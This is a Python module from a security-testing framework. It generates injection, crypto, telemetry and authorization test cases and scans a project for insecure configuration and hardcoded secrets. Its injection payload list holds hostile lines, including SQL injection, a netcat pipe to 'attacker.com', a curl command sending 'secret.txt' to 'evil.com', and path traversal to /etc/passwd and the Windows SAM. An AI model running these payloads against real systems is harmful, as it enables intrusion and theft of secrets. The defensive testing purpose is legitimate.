"""
Adversarial Attack Modules for DSLModel Red Team Framework
"""

import random
import string
import hashlib
import base64
import json
from typing import Dict, List, Any, Optional, Tuple
from pathlib import Path
from datetime import datetime
import asyncio

from .core import (
    SecurityTest, AttackVector, VulnerabilityReport,
    SeverityLevel, AttackType, VulnerabilityCategory
)

class AdversarialTestGenerator:
    """Generates adversarial test cases for security testing"""
    
    def __init__(self):
        self.test_cases: List[SecurityTest] = []
        
    def generate_injection_tests(self) -> List[SecurityTest]:
        """Generate code injection test cases"""
        injection_payloads = [
            # Python code injection
            "__import__('os').system('id')",
            "eval('__import__(\"os\").system(\"whoami\")')",
            "exec('import subprocess; subprocess.call([\"ls\"])')",
            
            # SQL injection (if applicable)
            "'; DROP TABLE users; --",
            "' OR '1'='1",
            "' UNION SELECT * FROM sensitive_data --",
            
            # Command injection
            "; cat /etc/passwd",
            "| nc attacker.com 4444",
            "&& curl http://evil.com/steal?data=$(cat secret.txt)",
            
            # Path traversal
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        ]
        
        tests = []
        for i, payload in enumerate(injection_payloads):
            tests.append(SecurityTest(
                test_id=f"injection_test_{i+1}",
                name=f"Injection Test {i+1}",
                description=f"Test for injection vulnerability with payload: {payload[:50]}...",
                attack_type=AttackType.CODE_INJECTION,
                category=VulnerabilityCategory.A03_INJECTION,
                severity=SeverityLevel.CRITICAL,
                target_component="user_input_handlers",
                test_payload=payload,
                expected_outcome="Input should be sanitized and payload rejected",
                remediation_hint="Implement input validation and parameterized queries"
            ))
        
        return tests
    
    def generate_crypto_tests(self) -> List[SecurityTest]:
        """Generate cryptographic attack test cases"""
        crypto_tests = [
            {
                "name": "Weak Key Generation Test",
                "payload": "generate_key(seed=12345)",
                "description": "Test for predictable key generation with fixed seed",
                "attack_type": AttackType.CRYPTOGRAPHIC,
                "hint": "Use cryptographically secure random number generators"
            },
            {
                "name": "Hash Collision Test",
                "payload": "md5_hash_collision_attack",
                "description": "Test MD5 hash collision vulnerability",
                "attack_type": AttackType.CRYPTOGRAPHIC,
                "hint": "Use SHA-256 or stronger hash functions"
            },
            {
                "name": "Timing Attack Test",
                "payload": "constant_time_comparison_test",
                "description": "Test for timing side-channel vulnerabilities",
                "attack_type": AttackType.CRYPTOGRAPHIC,
                "hint": "Use constant-time comparison functions"
            },
            {
                "name": "Weak Random Test",
                "payload": "random.random() for key generation",
                "description": "Test for use of non-cryptographic random",
                "attack_type": AttackType.CRYPTOGRAPHIC,
                "hint": "Use secrets.SystemRandom() for cryptographic purposes"
            }
        ]
        
        tests = []
        for i, test_data in enumerate(crypto_tests):
            tests.append(SecurityTest(
                test_id=f"crypto_test_{i+1}",
                name=test_data["name"],
                description=test_data["description"],
                attack_type=test_data["attack_type"],
                category=VulnerabilityCategory.A02_CRYPTOGRAPHIC_FAILURES,
                severity=SeverityLevel.HIGH,
                target_component="cryptographic_functions",
                test_payload=test_data["payload"],
                expected_outcome="Cryptographic operations should be secure",
                remediation_hint=test_data["hint"]
            ))
        
        return tests
    
    def generate_telemetry_tests(self) -> List[SecurityTest]:
        """Generate telemetry security test cases"""
        telemetry_payloads = [
            "password=secret123&log=true",
            "api_key=sk-1234567890abcdef&trace=enabled",
            "credit_card=4111111111111111&metrics=on",
            "ssn=123-45-6789&export=jaeger",
            "private_key=-----BEGIN RSA PRIVATE KEY-----",
        ]
        
        tests = []
        for i, payload in enumerate(telemetry_payloads):
            tests.append(SecurityTest(
                test_id=f"telemetry_test_{i+1}",
                name=f"Telemetry Data Leak Test {i+1}",
                description=f"Test for sensitive data exposure in telemetry: {payload[:30]}...",
                attack_type=AttackType.TELEMETRY_LEAK,
                category=VulnerabilityCategory.A09_LOGGING_MONITORING_FAILURES,
                severity=SeverityLevel.HIGH,
                target_component="telemetry_exporters",
                test_payload=payload,
                expected_outcome="Sensitive data should be filtered from telemetry",
                remediation_hint="Implement data sanitization before telemetry export"
            ))
        
        return tests
    
    def generate_authorization_tests(self) -> List[SecurityTest]:
        """Generate authorization bypass test cases"""
        auth_tests = [
            {
                "name": "Privilege Escalation Test",
                "payload": "user_role=admin&bypass_check=true",
                "description": "Test for privilege escalation vulnerabilities"
            },
            {
                "name": "JWT Token Manipulation",
                "payload": "eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJyb2xlIjoiYWRtaW4ifQ.",
                "description": "Test for JWT token manipulation"
            },
            {
                "name": "Session Fixation Test",
                "payload": "session_id=fixed_session_123",
                "description": "Test for session fixation vulnerabilities"
            }
        ]
        
        tests = []
        for i, test_data in enumerate(auth_tests):
            tests.append(SecurityTest(
                test_id=f"auth_test_{i+1}",
                name=test_data["name"],
                description=test_data["description"],
                attack_type=AttackType.AUTHORIZATION_BYPASS,
                category=VulnerabilityCategory.A01_BROKEN_ACCESS_CONTROL,
                severity=SeverityLevel.HIGH,
                target_component="authentication_system",
                test_payload=test_data["payload"],
                expected_outcome="Authorization checks should prevent access",
                remediation_hint="Implement proper authorization validation"
            ))
        
        return tests
    
    def generate_all_tests(self) -> List[SecurityTest]:
        """Generate all adversarial test cases"""
        all_tests = []
        all_tests.extend(self.generate_injection_tests())
        all_tests.extend(self.generate_crypto_tests())
        all_tests.extend(self.generate_telemetry_tests())
        all_tests.extend(self.generate_authorization_tests())
        
        self.test_cases = all_tests
        return all_tests

class PenetrationTester:
    """Automated penetration testing for DSLModel components"""
    
    def __init__(self, target_path: Path):
        self.target_path = target_path
        self.test_results: List[Dict[str, Any]] = []
        
    async def run_penetration_tests(self) -> List[Dict[str, Any]]:
        """Run comprehensive penetration tests"""
        self.test_results = []
        
        # Test network services
        await self._test_network_services()
        
        # Test file permissions
        await self._test_file_permissions()
        
        # Test configuration security
        await self._test_configuration_security()
        
        # Test API endpoints (if any)
        await self._test_api_endpoints()
        
        return self.test_results
    
    async def _test_network_services(self):
        """Test for insecure network services"""
        # Check for common insecure ports/services
        insecure_patterns = [
            r"port\s*=\s*23",  # Telnet
            r"port\s*=\s*21",  # FTP
            r"port\s*=\s*80",  # HTTP (should be HTTPS)
            r"ssl\s*=\s*False",  # Disabled SSL
            r"verify\s*=\s*False",  # Disabled certificate verification
        ]
        
        for py_file in self.target_path.rglob("*.py"):
            try:
                content = py_file.read_text()
                
                for pattern in insecure_patterns:
                    if re.search(pattern, content):
                        self.test_results.append({
                            "test_type": "network_security",
                            "file": str(py_file),
                            "finding": f"Insecure network configuration: {pattern}",
                            "severity": "HIGH",
                            "recommendation": "Use secure protocols and enable SSL/TLS verification"
                        })
                        
            except Exception:
                continue
    
    async def _test_file_permissions(self):
        """Test for insecure file permissions"""
        sensitive_files = [
            "*.key", "*.pem", "*.p12", "*.pfx",  # Crypto files
            ".env", "config.json", "settings.py",  # Config files
            "*.db", "*.sqlite",  # Database files
        ]
        
        for pattern in sensitive_files:
            for file_path in self.target_path.rglob(pattern):
                try:
                    import stat
                    file_stat = file_path.stat()
                    permissions = stat.filemode(file_stat.st_mode)
                    
                    # Check for world-readable sensitive files
                    if file_stat.st_mode & stat.S_IROTH:
                        self.test_results.append({
                            "test_type": "file_permissions",
                            "file": str(file_path),
                            "finding": f"World-readable sensitive file: {permissions}",
                            "severity": "MEDIUM",
                            "recommendation": "Restrict file permissions to owner only"
                        })
                        
                except Exception:
                    continue
    
    async def _test_configuration_security(self):
        """Test configuration files for security issues"""
        config_files = [
            "pyproject.toml", "setup.py", "requirements.txt",
            ".env", "config.json", "settings.py"
        ]
        
        for config_file in config_files:
            file_path = self.target_path / config_file
            if file_path.exists():
                try:
                    content = file_path.read_text()
                    
                    # Check for hardcoded secrets
                    secret_patterns = [
                        r"password\s*=\s*['\"][^'\"]+['\"]",
                        r"secret\s*=\s*['\"][^'\"]+['\"]",
                        r"token\s*=\s*['\"][^'\"]+['\"]",
                        r"api_key\s*=\s*['\"][^'\"]+['\"]",
                    ]
                    
                    for pattern in secret_patterns:
                        if re.search(pattern, content, re.IGNORECASE):
                            self.test_results.append({
                                "test_type": "configuration_security",
                                "file": str(file_path),
                                "finding": "Hardcoded secret in configuration",
                                "severity": "HIGH",
                                "recommendation": "Use environment variables for sensitive configuration"
                            })
                            
                except Exception:
                    continue
    
    async def _test_api_endpoints(self):
        """Test API endpoints for security issues"""
        # Look for Flask/FastAPI route definitions
        api_patterns = [
            r"@app\.route\s*\(\s*['\"]([^'\"]+)['\"]",
            r"@router\.(get|post|put|delete)\s*\(\s*['\"]([^'\"]+)['\"]",
        ]
        
        for py_file in self.target_path.rglob("*.py"):
            try:
                content = py_file.read_text()
                
                for pattern in api_patterns:
                    matches = re.findall(pattern, content)
                    for match in matches:
                        endpoint = match[1] if isinstance(match, tuple) else match
                        
                        # Check for potential issues
                        if "/admin" in endpoint.lower() and "auth" not in content.lower():
                            self.test_results.append({
                                "test_type": "api_security",
                                "file": str(py_file),
                                "finding": f"Admin endpoint without authentication: {endpoint}",
                                "severity": "CRITICAL",
                                "recommendation": "Implement authentication for admin endpoints"
                            })
                            
            except Exception:
                continue

class CryptoAttacker:
    """Specialized cryptographic attack simulations"""
    
    def __init__(self):
        self.attack_results: List[Dict[str, Any]] = []
        
    async def simulate_timing_attack(self, target_function: str) -> Dict[str, Any]:
        """Simulate timing attack on cryptographic function"""
        import time
        
        # Generate test inputs
        correct_input = "correct_password"
        incorrect_inputs = [
            "wrong_password",
            "a" * len(correct_input),
            "x" * (len(correct_input) * 2),
            "",
            "admin"
        ]
        
        timing_results = []
        
        # Simulate timing measurements (would call actual function in real test)
        for test_input in [correct_input] + incorrect_inputs:
            start_time = time.perf_counter()
            
            # Simulate function call with variable timing based on input
            if test_input == correct_input:
                await asyncio.sleep(0.001)  # Slightly longer for correct input
            else:
                await asyncio.sleep(0.0005)  # Shorter for incorrect input
            
            end_time = time.perf_counter()
            duration = end_time - start_time
            
            timing_results.append({
                "input": test_input[:10] + "..." if len(test_input) > 10 else test_input,
                "duration_ms": duration * 1000,
                "is_correct": test_input == correct_input
            })
        
        # Analyze timing differences
        correct_timing = next(r["duration_ms"] for r in timing_results if r["is_correct"])
        incorrect_timings = [r["duration_ms"] for r in timing_results if not r["is_correct"]]
        avg_incorrect = sum(incorrect_timings) / len(incorrect_timings)
        
        timing_difference = abs(correct_timing - avg_incorrect)
        
        return {
            "attack_type": "timing_attack",
            "target_function": target_function,
            "timing_difference_ms": timing_difference,
            "vulnerable": timing_difference > 0.1,  # 0.1ms threshold
            "timing_results": timing_results,
            "recommendation": "Use constant-time comparison functions" if timing_difference > 0.1 else "Timing appears constant"
        }
    
    async def simulate_weak_random_attack(self) -> Dict[str, Any]:
        """Simulate attack on weak random number generation"""
        import random
        
        # Test predictability of random sequence
        random.seed(12345)  # Fixed seed
        sequence = [random.random() for _ in range(100)]
        
        # Reset with same seed
        random.seed(12345)
        repeated_sequence = [random.random() for _ in range(100)]
        
        is_predictable = sequence == repeated_sequence
        
        return {
            "attack_type": "weak_random_attack",
            "predictable": is_predictable,
            "sequence_length": len(sequence),
            "vulnerability": "Predictable random sequence with fixed seed" if is_predictable else "Random sequence appears unpredictable",
            "recommendation": "Use secrets.SystemRandom() for cryptographic randomness"
        }
    
    async def simulate_hash_collision_attack(self) -> Dict[str, Any]:
        """Simulate hash collision attack"""
        import hashlib
        
        # Test MD5 collision (known vulnerable)
        test_inputs = [
            b"message1",
            b"message2", 
            b"The quick brown fox jumps over the lazy dog",
            b"The quick brown fox jumps over the lazy cog"
        ]
        
        md5_hashes = []
        sha256_hashes = []
        
        for input_data in test_inputs:
            md5_hash = hashlib.md5(input_data).hexdigest()
            sha256_hash = hashlib.sha256(input_data).hexdigest()
            
            md5_hashes.append(md5_hash)
            sha256_hashes.append(sha256_hash)
        
        # Check for collisions (simplified - real attack would use known collision pairs)
        md5_collisions = len(md5_hashes) != len(set(md5_hashes))
        sha256_collisions = len(sha256_hashes) != len(set(sha256_hashes))
        
        return {
            "attack_type": "hash_collision_attack",
            "md5_vulnerable": True,  # MD5 is known to be vulnerable
            "sha256_vulnerable": sha256_collisions,
            "test_results": {
                "md5_hashes": md5_hashes,
                "sha256_hashes": sha256_hashes
            },
            "recommendation": "Use SHA-256 or stronger hash functions, avoid MD5 and SHA-1"
        }

class TelemetryProber:
    """Probes telemetry systems for security issues"""
    
    def __init__(self, target_path: Path):
        self.target_path = target_path
        self.probe_results: List[Dict[str, Any]] = []
        
    async def probe_telemetry_leaks(self) -> List[Dict[str, Any]]:
        """Probe for telemetry data leaks"""
        self.probe_results = []
        
        # Check OTEL configuration files
        await self._probe_otel_configs()
        
        # Check for sensitive data in telemetry
        await self._probe_sensitive_data_exposure()
        
        # Check export destinations
        await self._probe_export_destinations()
        
        return self.probe_results
    
    async def _probe_otel_configs(self):
        """Probe OTEL configuration for security issues"""
        otel_path = self.target_path / "src" / "dslmodel" / "otel"
        if not otel_path.exists():
            return
        
        for py_file in otel_path.rglob("*.py"):
            try:
                content = py_file.read_text()
                
                # Check for insecure configurations
                insecure_patterns = {
                    r"insecure\s*=\s*True": "Insecure connection enabled",
                    r"verify_ssl\s*=\s*False": "SSL verification disabled",
                    r"timeout\s*=\s*None": "No timeout configured (DoS risk)",
                    r"debug\s*=\s*True": "Debug mode enabled in production",
                }
                
                for pattern, issue in insecure_patterns.items():
                    if re.search(pattern, content, re.IGNORECASE):
                        self.probe_results.append({
                            "probe_type": "otel_config",
                            "file": str(py_file),
                            "issue": issue,
                            "severity": "MEDIUM",
                            "recommendation": "Review and secure OTEL configuration"
                        })
                        
            except Exception:
                continue
    
    async def _probe_sensitive_data_exposure(self):
        """Probe for sensitive data in telemetry exports"""
        telemetry_files = list(self.target_path.rglob("*telemetry*.py")) + list(self.target_path.rglob("*trace*.py"))
        
        sensitive_patterns = {
            r"password\s*[:=]": "Password in telemetry",
            r"secret\s*[:=]": "Secret in telemetry", 
            r"token\s*[:=]": "Token in telemetry",
            r"api_key\s*[:=]": "API key in telemetry",
            r"credit_card": "Credit card data in telemetry",
            r"ssn\s*[:=]": "SSN in telemetry",
        }
        
        for py_file in telemetry_files:
            try:
                content = py_file.read_text()
                
                for pattern, issue in sensitive_patterns.items():
                    if re.search(pattern, content, re.IGNORECASE):
                        self.probe_results.append({
                            "probe_type": "sensitive_data_exposure",
                            "file": str(py_file),
                            "issue": issue,
                            "severity": "HIGH",
                            "recommendation": "Implement data sanitization before telemetry export"
                        })
                        
            except Exception:
                continue
    
    async def _probe_export_destinations(self):
        """Probe telemetry export destinations for security"""
        for py_file in self.target_path.rglob("*.py"):
            try:
                content = py_file.read_text()
                
                # Look for export endpoints
                export_patterns = [
                    r"http://[^/\s]+",  # HTTP endpoints (insecure)
                    r"localhost:\d+",   # Local endpoints (may be insecure)
                    r"\d+\.\d+\.\d+\.\d+:\d+",  # IP addresses (may be internal)
                ]
                
                for pattern in export_patterns:
                    matches = re.findall(pattern, content)
                    for match in matches:
                        severity = "HIGH" if match.startswith("http://") else "MEDIUM"
                        issue = f"Potentially insecure export destination: {match}"
                        
                        self.probe_results.append({
                            "probe_type": "export_destination",
                            "file": str(py_file),
                            "issue": issue,
                            "endpoint": match,
                            "severity": severity,
                            "recommendation": "Use HTTPS for external exports, secure internal endpoints"
                        })
                        
            except Exception:
                continue

import re